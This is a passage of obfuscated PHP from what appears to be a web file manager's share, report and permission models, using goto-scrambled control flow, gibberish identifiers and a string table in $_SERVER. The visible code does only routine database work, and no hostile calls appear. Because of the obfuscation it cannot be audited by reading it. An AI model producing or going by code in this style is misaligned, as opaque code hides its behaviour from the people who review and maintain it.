= SourceModel::TYPE_GROUP; } $BÃÒÏ¯ƒõ² = array($e–³œ“ Ç¦[475] => $DïÕööÆ‹è, $e–³œ“ Ç¦[411] => $DØƒÖ•™Â†, $e–³œ“ Ç¦[491] => intval($CŒ³‹Ù“ÖÉ[$e–³œ“ Ç¦[491]]), $e–³œ“ Ç¦[1772] => 0, $e–³œ“ Ç¦[1826] => -1); if ($CŒ³‹Ù“ÖÉ[$e–³œ“ Ç¦[1772]]) { $BÃÒÏ¯ƒõ²[$e–³œ“ Ç¦[1772]] = $CŒ³‹Ù“ÖÉ[$e–³œ“ Ç¦[1772]]; } else { if ($CŒ³‹Ù“ÖÉ[$e–³œ“ Ç¦[1826]]) { $BÃÒÏ¯ƒõ²[$e–³œ“ Ç¦[1826]] = $CŒ³‹Ù“ÖÉ[$e–³œ“ Ç¦[1826]]; } } $F„ˆÂˆ¸—[] = $BÃÒÏ¯ƒõ²; } goto a’æ£Öù; B‚µ¼¾É: $e–³œ“ Ç¦ =& $_SERVER[Šº]; if (!is_array($cİÖ´´¶)) { return !1; } $d¦ÆƒÙ¶¿ = Model($e–³œ“ Ç¦[1776]); goto F„ÓñÁìç; a’æ£Öù: return $d¦ÆƒÙ¶¿->addAll($F„ˆÂˆ¸—, array(), !0); goto B²±äÉŸá; B²±äÉŸá: } public function numViewAdd($BŠÀâÌŠ) { $bñâŒ„½ÙŠ =& $_SERVER[Šº]; $EŒç“ÍŞ¤¥ = array($bñâŒ„½ÙŠ[474] => $BŠÀâÌŠ); $this->where($EŒç“ÍŞ¤¥)->setAdd($bñâŒ„½ÙŠ[1823]); } public function numDownloadAdd($E›Òö®²³) { $DÜó‚åÁ…‡ =& $_SERVER[Šº]; $BÕÅŞÏˆÆ = array($DÜó‚åÁ…‡[474] => $E›Òö®²³); $this->where($BÕÅŞÏˆÆ)->setAdd($DÜó‚åÁ…‡[1824]); } protected function shareEdit($FŒ‘÷ß»Á±, $dêğà‰æ­) { goto bÊ“»¯×ƒ; CÌèµ„‰ïß: if (isset($dêğà‰æ­[$e±„®Ö³¾ê[1816]])) { $this->_shareAuthSet($FŒ‘÷ß»Á±, $dêğà‰æ­[$e±„®Ö³¾ê[1816]]); } return !0; goto b¸·Œó‚İ; bÊ“»¯×ƒ: $e±„®Ö³¾ê =& $_SERVER[Šº]; $bÅ¦ºİìµ = $this->getInfo($FŒ‘÷ß»Á±); if (!$bÅ¦ºİìµ) { return !1; } goto FÈ‹‰ŒÕá; FÈ‹‰ŒÕá: $this->_checkLinkShare($dêğà‰æ­, $bÅ¦ºİìµ); $c¸çŠÌÀğ = array(); $cõøôÃ¹ƒ = explode($e±„®Ö³¾ê[47], $e±„®Ö³¾ê[1827]); goto A‹‰ùç ´; A‹‰ùç ´: foreach ($cõøôÃ¹ƒ as $d¾Ÿğ­ùŠŒ) { if (!array_key_exists($d¾Ÿğ­ùŠŒ, $dêğà‰æ­)) { continue; } $c¸çŠÌÀğ[$d¾Ÿğ­ùŠŒ] = $dêğà‰æ­[$d¾Ÿğ­ùŠŒ]; } $this->shareEventAdd($bÅ¦ºİìµ[$e±„®Ö³¾ê[403]], $dêğà‰æ­, $e±„®Ö³¾ê[1644]); $this->where(array($e±„®Ö³¾ê[474] => $FŒ‘÷ß»Á±))->save($c¸çŠÌÀğ); goto CÌèµ„‰ïß; b¸·Œó‚İ: } private function _checkLinkShare($aäĞˆ¶ŒÛ´, $e¿ìœÛ‹ù) { goto DÀ¶á”ˆ“ì; D×¦¥ˆ¦»é: $F“¥£ŸÂ’Ü = $this->shareFileMeta($a–¡«°æŒ[$AÚñ£•Ÿ›°[454]]); if (isset($F“¥£ŸÂ’Ü[$AÚñ£•Ÿ›°[371]]) && $F“¥£ŸÂ’Ü[$AÚñ£•Ÿ›°[371]] == $AÚñ£•Ÿ›°[87]) { show_json(LNG($AÚñ£•Ÿ›°[1830]), !1); } goto B¼Ó‘ô™Ã; B¶‚ªˆÌ˜: if ($e¿ìœÛ‹ù[$AÚñ£•Ÿ›°[85]][$AÚñ£•Ÿ›°[29]] != $AÚñ£•Ÿ›°[192]) { $Cà‹¹°ÅãÌ = $this->_folderReport($Bøå¯Œ²§); if (!$Cà‹¹°ÅãÌ) { return; } show_json(LNG($AÚñ£•Ÿ›°[1828]) . $AÚñ£•Ÿ›°[1829] . $Cà‹¹°ÅãÌ, !1); } $a–¡«°æŒ = Model($AÚñ£•Ÿ›°[788])->fileInfoGet($e¿ìœÛ‹ù[$AÚñ£•Ÿ›°[85]][$AÚñ£•Ÿ›°[403]]); if (!$a–¡«°æŒ) { return; } goto D×¦¥ˆ¦»é; DÀ¶á”ˆ“ì: $AÚñ£•Ÿ›° =& $_SERVER[Šº]; if ($aäĞˆ¶ŒÛ´[$AÚñ£•Ÿ›°[480]] != $AÚñ£•Ÿ›°[87]) { return; } $Bøå¯Œ²§ = $e¿ìœÛ‹ù[$AÚñ£•Ÿ›°[85]][$AÚñ£•Ÿ›°[403]]; goto B¶‚ªˆÌ˜; B¼Ó‘ô™Ã: } private function _folderReport($F††ÑÑÊ«§) { goto E¶ë‰µ‡‡ï; CƒÀ¿óÎî…: if (!$EéÄíÙàòÖ) { return !1; } $EéÄíÙàòÖ = array_to_keyvalue($EéÄíÙàòÖ, $b¡¼–ÄÂ¾[33], $b¡¼–ÄÂ¾[454]); $AÙ«ß›ñ„ˆ = $b¡¼–ÄÂ¾[47] . $F††ÑÑÊ«§ . $b¡¼–ÄÂ¾[47]; goto D³Ó—±ºŠ™; E¤ìº¿£½¾: $B¬ööö‹Ğ£ = substr($f‡¿“ÈÌÚğ[$b¡¼–ÄÂ¾[494]], strpos($f‡¿“ÈÌÚğ[$b¡¼–ÄÂ¾[494]], $AÙ«ß›ñ„ˆ)); $b Š¶ãã = array($b¡¼–ÄÂ¾[403] => array($b¡¼–ÄÂ¾[7], trim($B¬ööö‹Ğ£, $b¡¼–ÄÂ¾[47]))); $b³‘¸ë­ = Model($b¡¼–ÄÂ¾[788])->where($b Š¶ãã)->field($b¡¼–ÄÂ¾[28])->select(); goto aÆß«öù…ô; D³Ó—±ºŠ™: $b Š¶ãã = array($b¡¼–ÄÂ¾[454] => array($b¡¼–ÄÂ¾[7], $EéÄíÙàòÖ), $b¡¼–ÄÂ¾[494] => array($b¡¼–ÄÂ¾[379], "\45{$AÙ«ß›ñ„ˆ}\x25"), $b¡¼–ÄÂ¾[430] => 0); $f‡¿“ÈÌÚğ = Model($b¡¼–ÄÂ¾[788])->where($b Š¶ãã)->field($b¡¼–ÄÂ¾[1832])->find(); if (!$f‡¿“ÈÌÚğ) { return !1; } goto E¤ìº¿£½¾; E¶ë‰µ‡‡ï: $b¡¼–ÄÂ¾ =& $_SERVER[Šº]; $b Š¶ãã = array($b¡¼–ÄÂ¾[454] => array($b¡¼–ÄÂ¾[957], 0), $b¡¼–ÄÂ¾[711] => 3); $EéÄíÙàòÖ = Model($b¡¼–ÄÂ¾[1831])->where($b Š¶ãã)->field($b¡¼–ÄÂ¾[454])->select(); goto CƒÀ¿óÎî…; aÆß«öù…ô: $bòî»“Øå = array_to_keyvalue($b³‘¸ë­, $b¡¼–ÄÂ¾[33], $b¡¼–ÄÂ¾[28]); $bòî»“Øå[] = $f‡¿“ÈÌÚğ[$b¡¼–ÄÂ¾[28]]; return implode($b¡¼–ÄÂ¾[8], $bòî»“Øå); goto d•ãæäîÌö; d•ãæäîÌö: } protected function remove($DĞâÕµÈ…º) { goto Eğí­ªÀ¾›; Eğí­ªÀ¾›: $cŠšïİ³Ã =& $_SERVER[Šº]; if (is_array($DĞâÕµÈ…º)) { $DĞâÕµÈ…º = array($cŠšïİ³Ã[7], $DĞâÕµÈ…º); } $FÓÕÈÅÁ‚Î = array($cŠšïİ³Ã[475] => $DĞâÕµÈ…º); goto A§Òš§Ç¹; A§Òš§Ç¹: $D÷¢Ìˆ™˜ƒ = $this->where($FÓÕÈÅÁ‚Î)->delete(); if ($D÷¢Ìˆ™˜ƒ) { Model($cŠšïİ³Ã[572])->where(array($cŠšïİ³Ã[475] => $DĞâÕµÈ…º))->delete(); } $D¤“¦”•ÖÛ = is_array($DĞâÕµÈ…º) ? $DĞâÕµÈ…º[1] : array($DĞâÕµÈ…º); goto E¬Ù¥¯¢ª; E¬Ù¥¯¢ª: for ($d‡ºÑ‚‡´ğ = 0; $d‡ºÑ‚‡´ğ < count($D¤“¦”•ÖÛ); $d‡ºÑ‚‡´ğ++) { $dÛ†áé†«ˆ = $this->getInfo($D¤“¦”•ÖÛ[$d‡ºÑ‚‡´ğ]); if ($dÛ†áé†«ˆ[$cŠšïİ³Ã[482]] == $cŠšïİ³Ã[87]) { Model($cŠšïİ³Ã[541])->eventShare($dÛ†áé†«ˆ[$cŠšïİ³Ã[403]], $cŠšïİ³Ã[1821]); } if ($dÛ†áé†«ˆ[$cŠšïİ³Ã[480]] == $cŠšïİ³Ã[87]) { Model($cŠšïİ³Ã[541])->eventShare($dÛ†áé†«ˆ[$cŠšïİ³Ã[403]], $cŠšïİ³Ã[1820]); } } return $D÷¢Ìˆ™˜ƒ; goto BÚ¥…Ûëá¢; BÚ¥…Ûëá¢: } protected function removeBySource($Fì‰ÎƒÇ‘‚) { goto FÌ¦×¦ÄÍ; C¶Î‚ª­ğš: $this->where($A×Œ£¼ÈÂ©)->delete(); Model($f›ğÔàêê¸[572])->where($A×Œ£¼ÈÂ©)->delete(); goto dÙˆİ£¼¢™; c©îêÌ£‹: $DÔ„öèÔÙ = array_to_keyvalue($DÔ„öèÔÙ, $f›ğÔàêê¸[33], $f›ğÔàêê¸[475]); if (!$DÔ„öèÔÙ) { return; } $A×Œ£¼ÈÂ© = array($f›ğÔàêê¸[474] => array($f›ğÔàêê¸[418], $DÔ„öèÔÙ)); goto C¶Î‚ª­ğš; FÌ¦×¦ÄÍ: $f›ğÔàêê¸ =& $_SERVER[Šº]; $A×Œ£¼ÈÂ© = array($f›ğÔàêê¸[417] => array($f›ğÔàêê¸[418], $Fì‰ÎƒÇ‘‚)); $DÔ„öèÔÙ = $this->field($f›ğÔàêê¸[475])->where($A×Œ£¼ÈÂ©)->select(); goto c©îêÌ£‹; dÙˆİ£¼¢™: } public function listAll($e‡ÚïÒâËâ) { goto DòÛ“Ù ¡¦; DƒÏÓğˆ…æ: return $e¸„ÌáÁ•; goto bì»Á«÷¶Ñ; DòÛ“Ù ¡¦: $eÆßÉÃœÅÑ =& $_SERVER[Šº]; $Fç±Â¹¹Ô« = array(); if ($e‡ÚïÒâËâ[$eÆßÉÃœÅÑ[1514]]) { $Fç±Â¹¹Ô«[$eÆßÉÃœÅÑ[1514]] = $e‡ÚïÒâËâ[$eÆßÉÃœÅÑ[1514]]; } goto dÁ—³œ´›; dÁ—³œ´›: if ($e‡ÚïÒâËâ[$eÆßÉÃœÅÑ[719]]) { $bèŸ¦—ºßÊ = $e‡ÚïÒâËâ[$eÆßÉÃœÅÑ[483]] ? $e‡ÚïÒâËâ[$eÆßÉÃœÅÑ[483]] : strtotime(date($eÆßÉÃœÅÑ[1833])); $Fç±Â¹¹Ô«[$eÆßÉÃœÅÑ[193]] = array($eÆßÉÃœÅÑ[330], array($e‡ÚïÒâËâ[$eÆßÉÃœÅÑ[719]], $bèŸ¦—ºßÊ)); } if ($e‡ÚïÒâËâ[$eÆßÉÃœÅÑ[29]]) { $Fç±Â¹¹Ô«[$e‡ÚïÒâËâ[$eÆßÉÃœÅÑ[29]]] = 1; } else { $Fç±Â¹¹Ô«[] = array($eÆßÉÃœÅÑ[480] => array($eÆßÉÃœÅÑ[957], 0), $eÆßÉÃœÅÑ[482] => array($eÆßÉÃœÅÑ[957], 0), $eÆßÉÃœÅÑ[1810] => $eÆßÉÃœÅÑ[1764]); } if ($e‡ÚïÒâËâ[$eÆßÉÃœÅÑ[1760]]) { $Fç±Â¹¹Ô«[] = array($eÆßÉÃœÅÑ[477] => $e‡ÚïÒâËâ[$eÆßÉÃœÅÑ[1760]], $eÆßÉÃœÅÑ[1420] => array($eÆßÉÃœÅÑ[379], "\x25{$e‡ÚïÒâËâ[$eÆßÉÃœÅÑ[1760]]}\x25"), $eÆßÉÃœÅÑ[1810] => $eÆßÉÃœÅÑ[1764]); } goto AŒë¸¸éî; AŒë¸¸éî: $e¸„ÌáÁ• = $this->_makeOrder()->where($Fç±Â¹¹Ô«)->selectPage(20); if (empty($e¸„ÌáÁ•[$eÆßÉÃœÅÑ[366]])) { return array(); } $this->_listDataApply($e¸„ÌáÁ•[$eÆßÉÃœÅÑ[366]]); goto DƒÏÓğˆ…æ; bì»Á«÷¶Ñ: } public function listDataApply($dƒ‘§­œ”ˆ) { $this->_listDataApply($dƒ‘§­œ”ˆ); return $dƒ‘§­œ”ˆ; } private function _listDataApply(&$B®•Ëå¸¢š) { goto c«¶´öƒò; Aá„Ô¾¼¨Æ: $aÎ‹„Šî‹÷ = array_to_keyvalue($B®•Ëå¸¢š, $Fº¼“µöàª[33], $Fº¼“µöàª[403]); $CÃ¦šŒ×…İ = Model($Fº¼“µöàª[788])->sourceListInfo($aÎ‹„Šî‹÷, !0); foreach ($B®•Ëå¸¢š as $B…×½¤ß„Ã => &$EÍŠùÚ®Ú¥) { $EÂèÙË¶İÊ = $EÍŠùÚ®Ú¥[$Fº¼“µöàª[1514]]; $EÍŠùÚ®Ú¥[$Fº¼“µöàª[1834]] = $dÇ‰†¢¶ á[$EÂèÙË¶İÊ] ? $dÇ‰†¢¶ á[$EÂèÙË¶İÊ] : !1; $c¨åøºÑ‘ù = $EÍŠùÚ®Ú¥[$Fº¼“µöàª[403]]; $EÍŠùÚ®Ú¥[$Fº¼“µöàª[85]] = $CÃ¦šŒ×…İ[$c¨åøºÑ‘ù] ? $CÃ¦šŒ×…İ[$c¨åøºÑ‘ù] : !1; if ($EÍŠùÚ®Ú¥[$Fº¼“µöàª[85]][$Fº¼“µöàª[430]] == $Fº¼“µöàª[87]) { unset($B®•Ëå¸¢š[$B…×½¤ß„Ã]); } if ($EÍŠùÚ®Ú¥[$Fº¼“µöàª[85]] != $Fº¼“µöàª[504] && !$EÍŠùÚ®Ú¥[$Fº¼“µöàª[85]]) { unset($B®•Ëå¸¢š[$B…×½¤ß„Ã]); } } goto B®·Åó—“; c«¶´öƒò: $Fº¼“µöàª =& $_SERVER[Šº]; $E×ìŒåŒ¶Æ = array_to_keyvalue($B®•Ëå¸¢š, $Fº¼“µöàª[33], $Fº¼“µöàª[1514]); $dÇ‰†¢¶ á = Model($Fº¼“µöàª[514])->userListInfo(array_unique($E×ìŒåŒ¶Æ)); goto Aá„Ô¾¼¨Æ; B®·Åó—“: unset($EÍŠùÚ®Ú¥); $B®•Ëå¸¢š = array_values($B®•Ëå¸¢š); goto B“‰¸ĞŠñ; B“‰¸ĞŠñ: } private function _makeOrder($Cï›¡ŒÀ”Ü = '') { goto cĞËŸîô’œ; d¥Ì›Œù: $C’êä³Âì = Input::get($Fâ±ò…¯Çç[442], $Fâ±ò…¯Çç[7], $Fâ±ò…¯Çç[423], $F´Õ§®‘âî); $AÄ®¤ù³ š = Input::get($Fâ±ò…¯Çç[443], $Fâ±ò…¯Çç[7], $Fâ±ò…¯Çç[1835], array($Fâ±ò…¯Çç[1759], $Fâ±ò…¯Çç[437])); $AÄ®¤ù³ š = $Bï–™©™Ü[$AÄ®¤ù³ š]; goto AôŞ¬øÛĞ±; cĞËŸîô’œ: $Fâ±ò…¯Çç =& $_SERVER[Šº]; $F´Õ§®‘âî = array($Fâ±ò…¯Çç[193], $Fâ±ò…¯Çç[483], $Fâ±ò…¯Çç[1823], $Fâ±ò…¯Çç[1824]); $Bï–™©™Ü = array($Fâ±ò…¯Çç[435] => $Fâ±ò…¯Çç[436], $Fâ±ò…¯Çç[437] => $Fâ±ò…¯Çç[438]); goto d¥Ì›Œù; AôŞ¬øÛĞ±: $Cï›¡ŒÀ”Ü = $Cï›¡ŒÀ”Ü . "{$C’êä³Âì}\x20{$AÄ®¤ù³ š}"; return $this->order($Cï›¡ŒÀ”Ü); goto e‹¨Á§Ü­Õ; e‹¨Á§Ü­Õ: } public function reportAdd($d÷ª¯ìĞÑ¥) { $B·Š™¯ŠÌ =& $_SERVER[Šº]; $DèŒÃ•ğì = array($B·Š™¯ŠÌ[475] => $d÷ª¯ìĞÑ¥[$B·Š™¯ŠÌ[475]], $B·Š™¯ŠÌ[1514] => USER_ID); if (Model($B·Š™¯ŠÌ[1831])->where($DèŒÃ•ğì)->find()) { return !1; } $AôÛÛà×± = array($B·Š™¯ŠÌ[475] => $d÷ª¯ìĞÑ¥[$B·Š™¯ŠÌ[475]], $B·Š™¯ŠÌ[1420] => $d÷ª¯ìĞÑ¥[$B·Š™¯ŠÌ[1420]], $B·Š™¯ŠÌ[403] => $d÷ª¯ìĞÑ¥[$B·Š™¯ŠÌ[403]], $B·Š™¯ŠÌ[454] => $d÷ª¯ìĞÑ¥[$B·Š™¯ŠÌ[454]], $B·Š™¯ŠÌ[1514] => USER_ID, $B·Š™¯ŠÌ[29] => $d÷ª¯ìĞÑ¥[$B·Š™¯ŠÌ[29]], $B·Š™¯ŠÌ[438] => $d÷ª¯ìĞÑ¥[$B·Š™¯ŠÌ[438]]); return Model($B·Š™¯ŠÌ[1831])->add($AôÛÛà×±); } public function reportList($a«ŒÁ’ˆ¨Š) { goto Bšó‚Ñå; Bšó‚Ñå: $bÀ§ÁÁ¦äí =& $_SERVER[Šº]; $fŸ°î›çë = array(); if ($a«ŒÁ’ˆ¨Š[$bÀ§ÁÁ¦äí[719]]) { $aæİĞ”Û± = $a«ŒÁ’ˆ¨Š[$bÀ§ÁÁ¦äí[483]] ? $a«ŒÁ’ˆ¨Š[$bÀ§ÁÁ¦äí[483]] : strtotime(date($bÀ§ÁÁ¦äí[1833])); $fŸ°î›çë[$bÀ§ÁÁ¦äí[193]] = array($bÀ§ÁÁ¦äí[330], array($a«ŒÁ’ˆ¨Š[$bÀ§ÁÁ¦äí[719]], $aæİĞ”Û±)); } goto e£ÁÜŠ—¸; bµ¹¬‚Şí´: if (empty($cêé½¤¾ï[$bÀ§ÁÁ¦äí[366]])) { return array(); } $bÜ»àÆãŠğ = array_to_keyvalue_group($cêé½¤¾ï[$bÀ§ÁÁ¦äí[366]], $bÀ§ÁÁ¦äí[711], $bÀ§ÁÁ¦äí[475]); if (!empty($bÜ»àÆãŠğ[0])) { $a«ŒÁ’ˆ¨Š = $bÜ»àÆãŠğ[0]; $fŸ°î›çë = array($bÀ§ÁÁ¦äí[475] => array($bÀ§ÁÁ¦äí[7], $a«ŒÁ’ˆ¨Š)); $fÚ¸Õ¨¿óí = $this->where($fŸ°î›çë)->field($bÀ§ÁÁ¦äí[475])->select(); $fÚ¸Õ¨¿óí = array_to_keyvalue($fÚ¸Õ¨¿óí, $bÀ§ÁÁ¦äí[33], $bÀ§ÁÁ¦äí[475]); $EöÄÕš„ = array_diff($a«ŒÁ’ˆ¨Š, $fÚ¸Õ¨¿óí); if (!empty($EöÄÕš„)) { foreach ($cêé½¤¾ï[$bÀ§ÁÁ¦äí[366]] as $b÷ùÆº„…Ä => $F¼Õ´¶¿»ñ) { if (in_array($F¼Õ´¶¿»ñ[$bÀ§ÁÁ¦äí[475]], $EöÄÕš„)) { unset($cêé½¤¾ï[$bÀ§ÁÁ¦äí[366]][$b÷ùÆº„…Ä]); } } } } goto fº„ä¯ô; e£ÁÜŠ—¸: if (isset($a«ŒÁ’ˆ¨Š[$bÀ§ÁÁ¦äí[29]]) && in_array($a«ŒÁ’ˆ¨Š[$bÀ§ÁÁ¦äí[29]], array($bÀ§ÁÁ¦äí[87], $bÀ§ÁÁ¦äí[1836], $bÀ§ÁÁ¦äí[1837], $bÀ§ÁÁ¦äí[1838], $bÀ§ÁÁ¦äí[1839]))) { $fŸ°î›çë[$bÀ§ÁÁ¦äí[29]] = $a«ŒÁ’ˆ¨Š[$bÀ§ÁÁ¦äí[29]]; } if (isset($a«ŒÁ’ˆ¨Š[$bÀ§ÁÁ¦äí[711]]) && in_array($a«ŒÁ’ˆ¨Š[$bÀ§ÁÁ¦äí[711]], array($bÀ§ÁÁ¦äí[504], $bÀ§ÁÁ¦äí[87], $bÀ§ÁÁ¦äí[1836], $bÀ§ÁÁ¦äí[1837]))) { $fŸ°î›çë[$bÀ§ÁÁ¦äí[711]] = $a«ŒÁ’ˆ¨Š[$bÀ§ÁÁ¦äí[711]]; } $Fí³Àõ•­Ë = Input::get($bÀ§ÁÁ¦äí[443], $bÀ§ÁÁ¦äí[7], $bÀ§ÁÁ¦äí[1835], array($bÀ§ÁÁ¦äí[1759], $bÀ§ÁÁ¦äí[437])); goto B³ŒêôÅ; fº„ä¯ô: $this->_listDataApply($cêé½¤¾ï[$bÀ§ÁÁ¦äí[366]]); return $cêé½¤¾ï; goto c‚ÓÎ¢¤æÏ; B³ŒêôÅ: $FŞ‰¶ÔøŒß = array($bÀ§ÁÁ¦äí[435] => $bÀ§ÁÁ¦äí[436], $bÀ§ÁÁ¦äí[437] => $bÀ§ÁÁ¦äí[438]); $eŞÎàÔ‘Å = $bÀ§ÁÁ¦äí[1840] . $FŞ‰¶ÔøŒß[$Fí³Àõ•­Ë]; $cêé½¤¾ï = Model($bÀ§ÁÁ¦äí[1831])->where($fŸ°î›çë)->order($eŞÎàÔ‘Å)->selectPage(20); goto bµ¹¬‚Şí´; c‚ÓÎ¢¤æÏ: } public function reportStatus($Fâçˆ‡‰·‘) { goto c´˜êÅâ; A­É¼„•åİ: $cÈÌ£÷šŠ = Model($b”©’óŠ–Ç[1831])->where($CâÒ‘òí‚ƒ)->save($f‘“˜ğŠêÆ); if ($Fâçˆ‡‰·‘[$b”©’óŠ–Ç[711]] == $b”©’óŠ–Ç[1836]) { if ($B°ˆ¢°šÑ¾[$b”©’óŠ–Ç[454]] != $b”©’óŠ–Ç[504] && $this->shareFileMeta($B°ˆ¢°šÑ¾[$b”©’óŠ–Ç[454]])) { $this->shareFileMeta($B°ˆ¢°šÑ¾[$b”©’óŠ–Ç[454]], 0); } $this->remove($B°ˆ¢°šÑ¾[$b”©’óŠ–Ç[475]]); return !0; } if ($cÈÌ£÷šŠ && $Fâçˆ‡‰·‘[$b”©’óŠ–Ç[711]] == $b”©’óŠ–Ç[1837]) { $BŞ½‡á÷ = $f‘“˜ğŠêÆ[$b”©’óŠ–Ç[711]] == $b”©’óŠ–Ç[1837] ? 1 : 0; $this->shareFileMeta($B°ˆ¢°šÑ¾[$b”©’óŠ–Ç[454]], $BŞ½‡á÷); $this->removeByFile($B°ˆ¢°šÑ¾[$b”©’óŠ–Ç[454]]); } goto dŸäÕç«Æ; c´˜êÅâ: $b”©’óŠ–Ç =& $_SERVER[Šº]; $CâÒ‘òí‚ƒ = array($b”©’óŠ–Ç[392] => $Fâçˆ‡‰·‘[$b”©’óŠ–Ç[392]]); $B°ˆ¢°šÑ¾ = Model($b”©’óŠ–Ç[1831])->where($CâÒ‘òí‚ƒ)->field($b”©’óŠ–Ç[1841])->find(); goto EÀêèÖöÈ; dŸäÕç«Æ: return $cÈÌ£÷šŠ; goto E÷ƒóÜÉç; EÀêèÖöÈ: if (!$B°ˆ¢°šÑ¾) { return !1; } $f‘“˜ğŠêÆ = array($b”©’óŠ–Ç[711] => $Fâçˆ‡‰·‘[$b”©’óŠ–Ç[711]]); if ($Fâçˆ‡‰·‘[$b”©’óŠ–Ç[711]] == $b”©’óŠ–Ç[1837] && $B°ˆ¢°šÑ¾[$b”©’óŠ–Ç[711]] == $b”©’óŠ–Ç[1837]) { $f‘“˜ğŠêÆ[$b”©’óŠ–Ç[711]] = 0; } goto A­É¼„•åİ; E÷ƒóÜÉç: } private function removeByFile($BÅØõ¤ƒ£ç) { goto BñœÃ¾–Î; c‹Öš’ù: $d‰È…—•è = array($dèÛƒ·Óø‹[403] => array($dèÛƒ·Óø‹[7], $DÛ·ñˆÙ¶¿), $dèÛƒ·Óø‹[480] => 1); $F‡§’¿Æäˆ = $this->where($d‰È…—•è)->field($dèÛƒ·Óø‹[475])->select(); if (empty($F‡§’¿Æäˆ)) { return; } goto bø²»œ‰ƒ; bø²»œ‰ƒ: $aÄ½˜Ô™™ = array_to_keyvalue($F‡§’¿Æäˆ, $dèÛƒ·Óø‹[33], $dèÛƒ·Óø‹[475]); $this->remove($aÄ½˜Ô™™); goto B±Äòƒ¶Ãá; BñœÃ¾–Î: $dèÛƒ·Óø‹ =& $_SERVER[Šº]; $F‡§’¿Æäˆ = Model($dèÛƒ·Óø‹[788])->where(array($dèÛƒ·Óø‹[454] => $BÅØõ¤ƒ£ç))->field($dèÛƒ·Óø‹[403])->select(); $DÛ·ñˆÙ¶¿ = array_to_keyvalue($F‡§’¿Æäˆ, $dèÛƒ·Óø‹[33], $dèÛƒ·Óø‹[403]); goto c‹Öš’ù; B±Äòƒ¶Ãá: } private function shareFileMeta($D—µóÆ‡Æ‰, $DßãöøŠ…¦ = null) { $aâ±…Š‰Ç =& $_SERVER[Šº]; $Aë¶àğ¯† = array($aâ±…Š‰Ç[454] => $D—µóÆ‡Æ‰, $aâ±…Š‰Ç[93] => $aâ±…Š‰Ç[1842]); if (is_null($DßãöøŠ…¦)) { return Model($aâ±…Š‰Ç[1843])->where($Aë¶àğ¯†)->find(); } $Aë¶àğ¯†[$aâ±…Š‰Ç[371]] = $DßãöøŠ…¦; Model($aâ±…Š‰Ç[1843])->add($Aë¶àğ¯†, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\162\143\145\137\141\x75\x74\150"; public function getAuth($d‘šÌ—Ì‘ì) { goto D¡¤ï»ÑÉ”; D¡¤ï»ÑÉ”: $b‚µ¡Å·ï =& $_SERVER[Šº]; $F‹äÈÊ›× = $this->sourceAuthSelect($d‘šÌ—Ì‘ì); $fãŞÎğ©¤ = array(); goto aÆë÷ãÑéÒ; dö‰›Ö°Ù£: array_multisort($dö‹äš½Õ¦, SORT_DESC, $fãŞÎğ©¤); return $fãŞÎğ©¤; goto eëÚËËÌÆ; aÆë÷ãÑéÒ: $dö‹äš½Õ¦ = array(); $d¾Ó»î¬† = 2 << 25; foreach ($F‹äÈÊ›× as $Aéì‚Í¨ˆ) { goto fà¯Êùìã; Dñùß™«ä–: $fÆ›ÓôÄçÖ = 0; if ($Aéì‚Í¨ˆ[$b‚µ¡Å·ï[411]] == SourceModel::TYPE_GROUP) { $fÆ›ÓôÄçÖ = $d¾Ó»î¬† * 2; } if ($Aéì‚Í¨ˆ[$b‚µ¡Å·ï[411]] == SourceModel::TYPE_USER) { $fÆ›ÓôÄçÖ = $d¾Ó»î¬†; } goto Fßò‚¸¼ğœ; Fßò‚¸¼ğœ: if ($Aéì‚Í¨ˆ[$b‚µ¡Å·ï[411]] == SourceModel::TYPE_USER && $Aéì‚Í¨ˆ[$b‚µ¡Å·ï[491]] == $b‚µ¡Å·ï[504]) { $fÆ›ÓôÄçÖ = 0; } $dö‹äš½Õ¦[] = $eËÍ™ìÃë¸[$b‚µ¡Å·ï[413]] + $fÆ›ÓôÄçÖ; goto dÅìŠ£˜“; fà¯Êùìã: $eËÍ™ìÃë¸ = Model($b‚µ¡Å·ï[1844])->listData($Aéì‚Í¨ˆ[$b‚µ¡Å·ï[1772]]); if (!$eËÍ™ìÃë¸) { continue; } $fãŞÎğ©¤[] = $Aéì‚Í¨ˆ; goto Dñùß™«ä–; dÅìŠ£˜“: } goto dö‰›Ö°Ù£; eëÚËËÌÆ: } public function sourceAuthSelect($FàñìèÔµ) { goto dôÜª‹Òª¢; d—é†±â…¼: if (count($C¿ÚëôˆßË) == count($FàñìèÔµ)) { return $BÉôÒ”Ê•Û ? $C¿ÚëôˆßË[$FàñìèÔµ[0]] : $C¿ÚëôˆßË; } $dŞ˜‡íŠ•Ï = $a““³ĞÙßÁ[1845]; $dĞ™—©„§Ğ = array($a““³ĞÙßÁ[403] => array($a““³ĞÙßÁ[7], $FàñìèÔµ)); goto fİŠå¾îš; fİŠå¾îš: $Dğƒ®ÉùŞË = $this->field($dŞ˜‡íŠ•Ï)->order($a““³ĞÙßÁ[392])->where($dĞ™—©„§Ğ)->select(); $D¼–´Û‰à = array_to_keyvalue_group($Dğƒ®ÉùŞË, $a““³ĞÙßÁ[403]); foreach ($FàñìèÔµ as $f¢“òÁ£Ô) { $D—‹”™Ñ¦[$f¢“òÁ£Ô] = $D¼–´Û‰à[$f¢“òÁ£Ô] ? $D¼–´Û‰à[$f¢“òÁ£Ô] : array(); } goto aÇÂÏí¶ˆÃ; aÇÂÏí¶ˆÃ: if ($BÉôÒ”Ê•Û) { return $Dğƒ®ÉùŞË; } return $D¼–´Û‰à; goto A”×¤®¾²¥; dôÜª‹Òª¢: $a““³ĞÙßÁ =& $_SERVER[Šº]; static $D—‹”™Ñ¦ = array(); $BÉôÒ”Ê•Û = is_array($FàñìèÔµ) ? !1 : !0; goto BÕ‚‚ì¨®Ã; BÕ‚‚ì¨®Ã: if ($BÉôÒ”Ê•Û) { $FàñìèÔµ = array($FàñìèÔµ); } $C¿ÚëôˆßË = array(); foreach ($FàñìèÔµ as $f¢“òÁ£Ô) { if (isset($D—‹”™Ñ¦[$f¢“òÁ£Ô])) { $C¿ÚëôˆßË[$f¢“òÁ£Ô] = $D—‹”™Ñ¦[$f¢“òÁ£Ô]; } } goto d—é†±â…¼; A”×¤®¾²¥: } public function setAuth($EÍ¼÷ËƒĞõ, $FÛ¾Ü¸Öó„) { goto f…¤†ò¶Ä; f…¤†ò¶Ä: $aá‡»»Š† =& $_SERVER[Šº]; $b§ÅÑ®¦É = Model($aá‡»»Š†[1192])->sourceInfo($EÍ¼÷ËƒĞõ); if (!$b§ÅÑ®¦É) { return !1; } goto EÈƒÒòò·; 